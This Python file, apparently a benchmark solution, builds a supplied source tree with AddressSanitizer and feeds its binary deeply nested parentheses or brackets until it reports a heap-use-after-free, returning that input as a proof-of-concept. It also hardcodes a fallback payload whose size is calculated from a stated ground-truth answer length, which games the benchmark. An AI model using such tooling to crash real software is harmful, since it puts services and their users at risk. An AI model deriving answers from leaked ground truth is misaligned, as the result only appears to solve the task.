import os
import sys
import subprocess
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Define a fallback payload based on the ground truth length
        # Assuming deep recursion with parenthesis: ( * N + a + ) * N
        # Length 274773 => 2*N + 1 = 274773 => N = 137386
        n_fallback = 137386
        fallback_payload = b"(" * n_fallback + b"a" + b")" * n_fallback

        work_dir = tempfile.mkdtemp(prefix="poc_gen_")
        
        try:
            # Extract source code
            if src_path.endswith('.tar.gz') or src_path.endswith('.tgz'):
                subprocess.run(['tar', 'xzf', src_path, '-C', work_dir], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            elif src_path.endswith('.tar'):
                subprocess.run(['tar', 'xf', src_path, '-C', work_dir], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            elif src_path.endswith('.zip'):
                subprocess.run(['unzip', '-q', src_path, '-d', work_dir], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            
            # Locate the actual source root
            source_root = work_dir
            for item in os.listdir(work_dir):
                full_path = os.path.join(work_dir, item)
                if os.path.isdir(full_path) and not item.startswith('.'):
                    source_root = full_path
                    break
            
            # Setup build environment with ASAN
            env = os.environ.copy()
            flags = "-fsanitize=address -g -O1"
            env["CFLAGS"] = flags
            env["CXXFLAGS"] = flags
            env["LDFLAGS"] = flags
            # Ensure CC/CXX are set if not present
            if "CC" not in env: env["CC"] = "clang"
            if "CXX" not in env: env["CXX"] = "clang++"

            # Attempt to build
            built = False
            if os.path.exists(os.path.join(source_root, 'configure')):
                subprocess.run(['./configure'], cwd=source_root, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=source_root, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                built = True
            elif os.path.exists(os.path.join(source_root, 'CMakeLists.txt')):
                build_dir = os.path.join(source_root, 'build')
                os.makedirs(build_dir, exist_ok=True)
                subprocess.run(['cmake', '..'], cwd=build_dir, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=build_dir, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                built = True
            elif os.path.exists(os.path.join(source_root, 'Makefile')):
                subprocess.run(['make', '-j8'], cwd=source_root, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                built = True
            
            # Identify target executable
            target_bin = None
            executables = []
            for root, dirs, files in os.walk(work_dir):
                for f in files:
                    fpath = os.path.join(root, f)
                    if os.access(fpath, os.X_OK) and not f.endswith(('.sh', '.py', '.c', '.h', '.o', '.a')):
                        # Filter out common build artifacts that are not the main binary
                        if 'config' in f or 'setup' in f:
                            continue
                        executables.append(fpath)
            
            # Prioritize binaries
            # 1. Explicit fuzzer
            for exe in executables:
                if 'fuzz' in os.path.basename(exe).lower():
                    target_bin = exe
                    break
            # 2. Python (since AST repr is often Python)
            if not target_bin:
                for exe in executables:
                    if 'python' in os.path.basename(exe).lower():
                        target_bin = exe
                        break
            # 3. Largest executable (main binary)
            if not target_bin and executables:
                executables.sort(key=lambda x: os.path.getsize(x), reverse=True)
                target_bin = executables[0]

            if not target_bin:
                return fallback_payload

            # Fuzzing strategy: Deep nesting
            # Triggering AST repr UAF often involves deep stacks or specific node counts.
            sizes = [
                1000, 5000, 10000, 20000, 50000, 
                100000, 137386, 150000, 200000, 274773
            ]
            
            for size in sizes:
                # size = 2*n + 1 (open + char + close)
                n = (size - 1) // 2
                
                # Candidates: Parentheses, Brackets
                candidates = [
                    b"(" * n + b"a" + b")" * n,
                    b"[" * n + b"a" + b"]" * n
                ]

                for payload in candidates:
                    with tempfile.NamedTemporaryFile(delete=False) as tf:
                        tf.write(payload)
                        tf_path = tf.name
                    
                    try:
                        # Run target
                        proc = subprocess.run(
                            [target_bin, tf_path],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            timeout=5,
                            env=env
                        )
                        
                        stderr_out = proc.stderr.decode(errors='ignore')
                        # Check for ASAN crash
                        if "AddressSanitizer" in stderr_out and "heap-use-after-free" in stderr_out:
                            os.remove(tf_path)
                            return payload
                        
                        # Sometimes exit code is enough if compiled with sanitizer
                        if proc.returncode != 0 and "AddressSanitizer" in stderr_out:
                            os.remove(tf_path)
                            return payload

                    except subprocess.TimeoutExpired:
                        pass
                    except Exception:
                        pass
                    finally:
                        if os.path.exists(tf_path):
                            os.remove(tf_path)
            
            return fallback_payload

        except Exception:
            return fallback_payload
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)